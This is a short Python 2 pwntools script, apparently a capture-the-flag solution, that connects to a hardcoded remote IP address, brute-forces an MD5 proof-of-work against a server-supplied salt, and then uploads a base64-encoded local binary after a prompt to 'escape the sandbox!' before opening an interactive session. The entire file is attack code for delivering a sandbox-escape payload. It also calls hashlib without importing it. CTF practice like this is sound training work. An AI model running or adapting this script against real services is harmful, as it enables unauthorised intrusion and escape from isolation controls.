from pwn import *
from random import Random
import base64


def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str += chars[random.randint(0, length)]
    return str
io = remote("39.105.151.182", 9999)
io.recvuntil("key+\"")
salt = io.recvuntil("\"")[:-1]
io.recvuntil("==")

result = io.recvuntil("\n")[:-1]
print salt, result

i = 0
key = ""
while True:
    m2 = hashlib.md5()
    key = random_str() + salt
    m2.update(key)
    md5str = m2.hexdigest()
    i = i + 1
    if (i % 10000 == 0):
        print md5str[0:4], result
    if md5str[0:4] == result:
        print key
        break

fd = open("./solve", "r")
ELF = fd.read()
ELF = base64.b64encode(ELF)
fd.close()
print io.recvuntil("Give me the key")
io.sendline(key[:8])
print io.recvuntil("escape the sandbox!")
io.sendline(ELF)
io.interactive()
